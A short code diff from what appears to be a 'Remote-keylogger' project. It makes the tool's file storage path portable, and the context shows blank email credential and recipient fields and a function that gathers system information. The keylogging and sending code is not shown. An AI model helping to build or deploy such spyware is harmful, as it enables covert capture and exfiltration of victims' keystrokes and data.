@@ -25,8 +25,8 @@ password = " "  # Password of the email address
 toaddr = " "  # This email address is the one that will receive the email
 
 # File storage path
-file_path = "C:\\Users\\Admin\\Desktop\\Remote-keylogger"
-file_merge = file_path + "\\"
+file_path = os.path.dirname(os.path.abspath(__file__))
+file_merge = file_path + os.sep
 
 # Function to collect system information
 def computer_information():
